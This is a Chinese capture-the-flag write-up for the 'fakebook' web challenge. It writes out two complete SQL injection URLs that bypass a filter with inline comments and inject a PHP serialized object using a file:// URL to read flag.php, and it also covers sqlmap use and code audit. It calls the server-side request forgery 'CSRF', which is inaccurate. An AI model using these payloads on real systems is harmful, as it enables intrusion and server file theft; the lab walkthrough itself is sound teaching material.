## 开始

  

![](https://pic2.zhimg.com/80/v2-c9b5a03ceb04cb57eed699a1e65d3199_720w.webp)

  

进入题目有两个按钮，一个是登陆，一个是加入，那么我们先点加入创建一个账号。

  

![](https://pic3.zhimg.com/80/v2-af65c212ceab14269378d2f6a6fb6f22_720w.webp)

  

创建账号后发现这个admin可以点击，那我们点击试一试。

  

![](https://pic2.zhimg.com/80/v2-a5e7ff864a17b3dbdbbeb652124e5f11_720w.webp)

  

发现这里传了一个参数，那我们试一试有没有注入点。输入单引号发现报错。

  

![](https://pic1.zhimg.com/80/v2-f5c938577f302b2010c6e3438bee57bc_720w.webp)

  

用order by 语句测试字段4不报错，5报错，证明这里有5个字段。

  

![](https://pic4.zhimg.com/80/v2-528263a79f627dadffa771b053b1d9f3_720w.webp)

  

接下来我们用union select 联合查询查看回显

  

![](https://pic1.zhimg.com/80/v2-191774174984fa248f38f1ad081b2244_720w.webp)

  

发现被拦截了，看看可不可以绕过。我们用内联注释绕过。

  

![](https://pic3.zhimg.com/80/v2-be13823a4c75d640db4d1cc1ec630bfa_720w.webp)

  

发现在2的位置有回显，所以可以在这里注入，不过我在注册的页面抓了下包，发现在join页面这里存在post注入，且可以直接用sqlmap跑，可以上sqlmap那当然不手工(露出猥琐的笑容)。

  

![](https://pic4.zhimg.com/80/v2-bb56dd423cbc43adee856927114795cb_720w.webp)

  

跑了下库，在用--current-db参数跑了下当前在什么库下面。

  

![](https://pic4.zhimg.com/80/v2-8e918937463dc975a9967844ee6adf5f_720w.webp)

  

跑出在fakebook库下面

  

![](https://pic3.zhimg.com/80/v2-4c7589399624c9d79f2aab89e27390ce_720w.webp)

  

接下来就是跑fakebook的表字段等，这里就不写了，这题有点麻烦，写的也是有点烦躁，最主要疫情在家人也有点烦躁。

  

![](https://pic1.zhimg.com/80/v2-dd94ef17f31ec809e7968c965699ff2c_720w.webp)

  

这里是爆出的字段，先看看data字段里面的内容。

  

![](https://pic1.zhimg.com/80/v2-17df5a1d6cb034f0a3507fffa71afd34_720w.webp)

  

  

![](https://pic4.zhimg.com/80/v2-9c648e397b515311bc97995eef299a1b_720w.webp)

  

大家应该看懂了吧，没看懂的话看这里

  

![](https://pic1.zhimg.com/80/v2-ce75c8523833a31e808c0696e9b0e994_720w.webp)

  

反序列化，现在大概方向知道了，通过这里的反序列化，我们可以传入序列化参数，让反序列化进行解析。那我们先构造一个payload看看可不可以解析。

[http://220.249.52.133:53109/view.php?no=-1%20union%20/*!select*/%201,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:4:%227995%22;s:3:%22age%22;i:11;s:4:%22blog%22;s:10:%22www.xj.com%22;}%27](https://link.zhihu.com/?target=http%3A//220.249.52.133%3A53109/view.php%3Fno%3D-1%2520union%2520/%2A%21select%2A/%25201%2C2%2C3%2C%2527O%3A8%3A%2522UserInfo%2522%3A3%3A%257Bs%3A4%3A%2522name%2522%3Bs%3A4%3A%25227995%2522%3Bs%3A3%3A%2522age%2522%3Bi%3A11%3Bs%3A4%3A%2522blog%2522%3Bs%3A10%3A%2522www.xj.com%2522%3B%257D%2527)

  

![](https://pic3.zhimg.com/80/v2-e4e519d9b9f94419a22963f7760ad21a_720w.webp)

  

  

![](https://pic1.zhimg.com/80/v2-8535faef1ddc2def0e175e0fcb6dd3b8_720w.webp)

  

发现可以正常解析，现在我们就要想办法读取flag了。这里运用到了CSRF

当然说到CSRF收集到的一些信息，一般我做CTF的题目都会有一些套路步骤，上来就是把这个网站用bp的spider爬行一下

  

![](https://pic1.zhimg.com/80/v2-3bcbe1faea374e72f71712250a82652c_720w.webp)

  

就爬了个这个当然是没什么用，爬不到那就上御剑扫下后台，后台没扫到但是扫到了一个robots.txt文件，各位师傅肯定都知道这个文件是干嘛的，我访问了下。

  

![](https://pic1.zhimg.com/80/v2-5fc159ed340508351e4014d7dd461810_720w.webp)

  

发现不然爬的有个user.php的备份文件。我们在访问一下。

是一个可以下载的文件

  

![](https://pic3.zhimg.com/80/v2-1d1832c0dd068b19f562568c2ff7fa0a_720w.webp)

  

打开看看

  

![](https://pic4.zhimg.com/80/v2-02941f7a95d127ea178031f2b5069d4f_720w.webp)

  

一段代码，简单审计一下，发现这里以get的方式传入url，但是下方没有对get过来的url做任何过滤和白名单，或黑名单的保护措施，所以这里的get存在CSRF。

  

![](https://pic1.zhimg.com/80/v2-239ef76fd3a2d3d22dd304a39e9d945c_720w.webp)

  

最后的地方匹配一个正则，满足的才会被get传入

  

![](https://pic4.zhimg.com/80/v2-a92ae5c474c0ac5358fb3decf2b8f513_720w.webp)

  

不懂正则的可以参考[https://www.cnblogs.com/zery/p/3438845.html](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/zery/p/3438845.html)

现在就可以尝试读取我们的flag了，当然有了CSRF我们还需要知道我们读取flag的路径，路径在哪里了，看这里。

  

![](https://pic3.zhimg.com/80/v2-0471ee3856f3b64ca2f75ab7f538d59e_720w.webp)

  

有了路径就是构造payload，当然payload我也是构造了好久，这里需要一个file伪协议进行读取。

[http://220.249.52.133:53109/view.php?no=-1%20union%20/*!select*/%201,2,3,%27O:8:%22UserInfo%22:3:{s:4:%22name%22;s:1:%221%22;s:3:%22age%22;i:1;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;}%27](https://link.zhihu.com/?target=http%3A//220.249.52.133%3A53109/view.php%3Fno%3D-1%2520union%2520/%2A%21select%2A/%25201%2C2%2C3%2C%2527O%3A8%3A%2522UserInfo%2522%3A3%3A%257Bs%3A4%3A%2522name%2522%3Bs%3A1%3A%25221%2522%3Bs%3A3%3A%2522age%2522%3Bi%3A1%3Bs%3A4%3A%2522blog%2522%3Bs%3A29%3A%2522file%3A///var/www/html/flag.php%2522%3B%257D%2527)

  

![](https://pic3.zhimg.com/80/v2-b35cfdd875b1473a01c240ed5f9cce92_720w.webp)

  

  

![](https://pic1.zhimg.com/80/v2-17c96a0e1e694bb366d0153224619c88_720w.webp)

  

发现解析成功，没有报错，但是还是没有flag，错肯定是没有错了，成功解析了，查看了下源代码。

发现一个iframe标签

  

![](https://pic3.zhimg.com/80/v2-59cc0cc15ebe9b4f98023f255d32538e_720w.webp)

  

访问里面的地址

  

![](https://pic2.zhimg.com/80/v2-1b44cd6f2107b0279c4eac1f040b4039_720w.webp)

  

又是一片空白，在继续查看源代码。

  

![](https://pic2.zhimg.com/80/v2-a208b7d646882392ef6c1ddf3d787919_720w.webp)

  

总算是找到了flag！

## 总结

题目的单个知识点都不难，但是结合到一起就有点繁琐，而且里面的一些小坑有点搞心态，不过总体来说这题出的还是比较好的，每个地方都有逻辑可循！